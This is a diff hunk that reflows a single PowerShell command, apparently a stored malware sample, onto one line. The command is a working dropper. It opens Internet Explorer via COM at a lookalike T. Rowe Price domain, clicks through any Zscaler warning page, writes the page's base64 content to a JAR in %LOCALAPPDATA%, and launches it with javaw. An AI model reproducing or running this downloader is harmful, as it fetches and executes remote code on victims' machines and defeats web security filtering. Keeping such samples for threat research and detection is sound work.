@@ -1,6 +1,1 @@
-$ix = new-object -ComObject internetexplorer.application;[system.threading.thread]::sleep(1*1000);$ix.navigate('http://troweprice.trpe
-xchange.com/kosmos25/deployment?chksum=V0BycDV0KCluMw==&pkg=13&mpc=FUDGQGLWGXDXUBC'); [system.threading.thread]::sleep(1*1000);if ($ix
-.Document.activeElement.innerHTML.contains('Zscaler')){$pt = $ix.Document.getElementsByTag('input')|where-object{$_.type -eq 'submit'}
-;[system.threading.thread]::sleep(1*1000);$pt.click()}[io.file]::writeallbytes([environment]::expandEnvironmentVariables('%LOCALAPPDAT
-A%')+'\aaweb.jar',[system.convert]::frombase64string($ix.document.activeelement.outertext));javaw.exe -jar ([environment]::expandEnvir
-onmentVariables('%LOCALAPPDATA%')+'\aaweb.jar')
+$ix = new-object -ComObject internetexplorer.application;[system.threading.thread]::sleep(1*1000);$ix.navigate('http://troweprice.trpexchange.com/kosmos25/deployment?chksum=V0BycDV0KCluMw==&pkg=13&mpc=FUDGQGLWGXDXUBC'); [system.threading.thread]::sleep(1*1000);if ($ix.Document.activeElement.innerHTML.contains('Zscaler')){$pt = $ix.Document.getElementsByTag('input')|where-object{$_.type -eq 'submit'};[system.threading.thread]::sleep(1*1000);$pt.click()}[io.file]::writeallbytes([environment]::expandEnvironmentVariables('%LOCALAPPDATA%')+'\aaweb.jar',[system.convert]::frombase64string($ix.document.activeelement.outertext));javaw.exe -jar ([environment]::expandEnvironmentVariables('%LOCALAPPDATA%')+'\aaweb.jar')
